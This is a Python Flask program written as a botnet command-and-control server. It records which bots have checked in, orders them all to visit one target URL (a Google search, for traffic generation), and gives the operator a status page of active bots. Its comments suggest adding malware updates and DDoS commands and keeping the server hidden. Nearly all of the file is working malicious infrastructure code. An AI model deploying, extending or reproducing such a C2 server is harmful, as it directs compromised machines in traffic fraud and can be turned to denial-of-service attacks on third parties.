from flask import Flask, jsonify, request
import threading
import time

# --- Configuration ---
app = Flask(__name__)
# The target URL that the bots will be commanded to visit
GLOBAL_TARGET_URL = "https://www.google.com/search?q=traffic+generation+mechanism"
# The port the C&C server will run on
C2_PORT = 5000

# Simple in-memory storage for bot status (IP, last check-in time)
bot_status = {}
# Lock for thread-safe access to bot_status
status_lock = threading.Lock()

@app.route('/c2/get_command', methods=['GET'])
def get_command():
    """
    Endpoint for bots to check in and receive their next command.
    """
    bot_ip = request.remote_addr
    current_time = time.time()
    
    with status_lock:
        bot_status[bot_ip] = current_time
        
    # The command is simply the URL to visit
    command = {"action": "VISIT", "target_url": GLOBAL_TARGET_URL}
    
    # In a real C&C, this would be more complex, potentially including:
    # - Conditional commands based on bot's location/status
    # - Commands for updating malware, performing DDoS, etc.
    
    return jsonify(command), 200

@app.route('/c2/status', methods=['GET'])
def get_status():
    """
    Endpoint for the Bot Herder (Operator) to view the status of the botnet.
    """
    active_bots = 0
    inactive_bots = 0
    current_time = time.time()
    
    with status_lock:
        # Define a bot as "active" if it checked in within the last 5 minutes (300 seconds)
        for last_check_in in bot_status.values():
            if (current_time - last_check_in) < 300:
                active_bots += 1
            else:
                inactive_bots += 1
        
        total_bots = len(bot_status)
        
        status_report = {
            "total_bots_seen": total_bots,
            "active_bots_5min": active_bots,
            "inactive_bots": inactive_bots,
            "current_target": GLOBAL_TARGET_URL,
            "last_check_ins": bot_status # For detailed view
        }
        
    return jsonify(status_report), 200

def run_c2_server():
    """
    Starts the Flask C&C server.
    """
    print(f"--- C&C Server Starting on port {C2_PORT} ---")
    # Note: host='0.0.0.0' is necessary to make the server externally accessible
    # In a real scenario, this would be a highly secured, hidden server.
    app.run(host='0.0.0.0', port=C2_PORT, debug=False)

if __name__ == '__main__':
    # This is a simplified, non-persistent C&C server for demonstration.
    # It does not include the server-side HTTP redirect mechanism, which would be
    # implemented on a separate "landing page" server, not the C&C itself.
    run_c2_server()
